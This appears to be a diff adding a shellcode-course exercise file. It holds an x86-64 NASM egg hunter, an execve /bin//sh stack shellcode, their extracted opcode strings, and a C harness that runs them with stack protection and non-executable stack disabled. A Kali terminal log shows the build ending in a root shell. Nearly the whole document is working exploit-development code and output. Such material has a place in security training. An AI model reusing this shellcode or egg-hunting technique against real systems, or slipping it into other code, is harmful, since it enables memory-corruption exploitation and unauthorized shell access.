@@ -1,0 +1,116 @@
+==hunter.nasm====
+global _start
+
+section .text
+
+_start:
+
+        mov eax, 0xabababab ; Moving Egg to eax
+        push rsp
+        pop rbx                     ;Mov stack pointer address to rbx
+
+jmp:
+        inc rbx
+        push rbx                    ; Incrementing address value and moving the value to rdi
+        pop rdi
+        scasd                       ; Compare EAX with dword at RDI and set status flags
+        jnz jmp
+        scasd
+        jnz jmp
+        jmp rdi			    ; Jump to shellcode
+
+=================
+root@kali:/opt/slae/egghunt# nano hunter.nasm
+root@kali:/opt/slae/egghunt# nasm -f elf64 hunter.nasm
+root@kali:/opt/slae/egghunt# ld hunter.o -o hunter
+root@kali:/opt/slae/egghunt# ./hunter
+Segmentation fault
+root@kali:/opt/slae/egghunt#  for i in $(objdump -d ./hunter -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
+\xb8\xab\xab\xab\xab\x54\x5b\x48\xff\xc3\x53\x5f\xaf\x75\xf8\xaf\x75\xf5\xff\xe7
+root@kali:/opt/slae/egghunt# nano shellcode.c
+root@kali:/opt/slae/egghunt#  gcc -m64 -fno-stack-protector -z execstack shellcode.c -o shellcode
+root@kali:/opt/slae/egghunt# ./shellcode
+EggHunter length: 20
+Shellcode length: 40
+# id
+uid=0(root) gid=0(root) groups=0(root)
+#
+
+=================
+
+
+====Execve-Stack.nasm=====
+global _start
+
+section .text
+
+_start:
+
+        ; First NULL push
+
+        xor rax, rax
+        push rax
+
+        ; push /bin//sh in reverse
+
+        mov rbx, 0x68732f2f6e69622f
+        push rbx
+
+        ; store /bin//sh address in RDI
+
+        mov rdi, rsp
+
+        ; Second NULL push
+        push rax
+
+        ; set RDX
+        mov rdx, rsp
+
+
+        ; Push address of /bin//sh
+        push rdi
+
+        ; set RSI
+
+        mov rsi, rsp
+
+        ; Call the Execve syscall
+        add rax, 59
+        syscall
+======================
+
+
+
+
+
+
+==========Shellcode.c=================
+#include <stdio.h>
+#include <string.h>
+
+unsigned char egghunter[] = \
+"\xb8\xab\xab\xab\xab\x54\x5b\x48\xff\xc3\x53\x5f\xaf\x75\xf8\xaf\x75\xf5\xff\xe7";
+
+int main(){
+
+/* Payload */
+
+unsigned char shellcode[] = \
+"\xab\xab\xab\xab"
+"\xab\xab\xab\xab"
+"\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";
+
+        printf("EggHunter length: %d\n", strlen(egghunter));
+        printf("Shellcode length: %d\n", strlen(shellcode));
+
+        int (*ret)() = (int(*)())egghunter;
+        ret();
+}
+
+
+================
+
+
+
+
+
